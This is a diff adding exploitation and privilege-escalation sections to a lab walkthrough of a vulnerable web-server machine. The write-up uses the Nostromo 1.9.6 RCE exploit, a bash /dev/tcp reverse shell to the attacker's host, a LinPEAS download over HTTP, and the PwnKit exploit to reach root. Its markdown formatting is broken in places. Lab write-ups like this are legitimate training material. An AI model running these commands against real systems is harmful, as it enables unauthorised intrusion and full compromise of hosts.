@@ -96,8 +96,121 @@ While WPScan confirmed the site uses outdated components, no immediate critical 
 
 ---
 
-### 🚀 Next Steps
+## 🚀 Phase 3: Exploitation (Port 2222)
 
-* [ ] Exploit CVE-2019-16278 on Port 2222 for shell access.
-* [ ] Verify Ghostcat vulnerability on Port 8009.
-* [ ] Search for sensitive configuration files in the file system.
+### Vulnerability Research
+Based on the initial scan, the **Nostromo 1.9.6** web server was flagged as a high-priority target. Using `searchsploit`, I looked for publicly available exploits.
+
+```bash
+searchsploit nostromo 1.9.6
+
+Exploit Identified:
+
+    Title: nostromo 1.9.6 - Remote Code Execution
+
+    Path: multiple/remote/47837.py
+
+    CVE: CVE-2019-16278
+
+Preparing the Exploit
+
+I mirrored the exploit to my local working directory for analysis and execution:
+Bash
+
+searchsploit -m multiple/remote/47837.py
+
+The script targets a path traversal vulnerability in the nhttpd server, allowing for unauthenticated Remote Code Execution (RCE) by sending specially crafted HTTP requests.
+### Executing the Exploit
+After verifying the script requirements (Python 2), I tested the Remote Code Execution (RCE) by executing the `id` command.
+
+```bash
+python2 47837.py 192.168.0.102 2222 id
+
+Response:
+Plaintext
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon),0(root)
+
+Establishing a Reverse Shell
+
+To gain a more stable and interactive environment, I initiated a reverse shell.
+
+    Setting up the listener:
+    On my local machine (Kali), I started a netcat listener on port 4444:
+    Bash
+
+    nc -lvnp 4444
+
+
+2. **Triggering the shell:**
+   Using a bash reverse shell payload from `revshells.com`, I executed the following via the exploit:
+   ```bash
+   python2 47837.py 192.168.0.102 2222 "bash -c 'bash -i >& /dev/tcp/192.168.0.183/4444 0>&1'"
+   
+
+Success:
+I received a connection back and obtained a shell as the daemon user.
+Bash
+
+Connection received on 192.168.0.102 37108
+daemon@webserver:/usr/bin$
+## 🛡️ Phase 4: Privilege Escalation
+
+### System Enumeration
+After gaining a foothold, I performed local enumeration to find a path to root. Since manual enumeration didn't immediately reveal unique misconfigurations or flags, I opted for an automated script to speed up the process.
+
+1. **Transferring LinPEAS:**
+   On my local machine, I hosted the script using a Python HTTP server:
+   ```bash
+   python3 -m http.server 8000
+   
+
+On the target machine, I downloaded it to the /tmp directory (the only writable partition):
+Bash
+
+cd /tmp
+wget [http://192.168.0.183:8000/linpeas.sh](http://192.168.0.183:8000/linpeas.sh)
+chmod +x linpeas.sh
+./linpeas.sh
+
+Identifying Vulnerabilities
+
+The LinPEAS output highlighted several critical kernel and service vulnerabilities. The most promising was PwnKit (CVE-2021-4034), a local privilege escalation vulnerability in Polkit's pkexec.
+
+Vulnerability Details:
+
+    CVE: 2021-4034 (PwnKit)
+
+    Exposure: Highly Probable
+
+    Target: Sudo version 1.8.27 / Polkit
+
+Exploitation (Path to Root)
+
+I decided to use the PwnKit exploit due to its reliability and high success rate on Debian-based systems.
+
+    Download and Extract:
+    Bash
+
+wget [https://codeload.github.com/berdav/CVE-2021-4034/zip/main](https://codeload.github.com/berdav/CVE-2021-4034/zip/main) -O pwnkit.zip
+unzip pwnkit.zip
+cd CVE-2021-4034-main
+
+Execution:
+I used the provided shell script wrapper which automates the compilation and execution process.
+Bash
+
+    chmod +x cve-2021-4034.sh
+    ./cve-2021-4034.sh
+
+Final Result:
+Bash
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+## 🏁 Conclusion
+The compromise of the **My Web Server** machine was achieved through:
+1. **Initial Access:** Exploiting an RCE vulnerability in the legacy Nostromo 1.9.6 web server (CVE-2019-16278).
+2. **Privilege Escalation:** Utilizing the PwnKit (CVE-2021-4034) vulnerability to escalate from the `daemon` user to `root`.
+
+This lab demonstrates the danger of running outdated web services and the critical importance of patching core system utilities like Polkit.
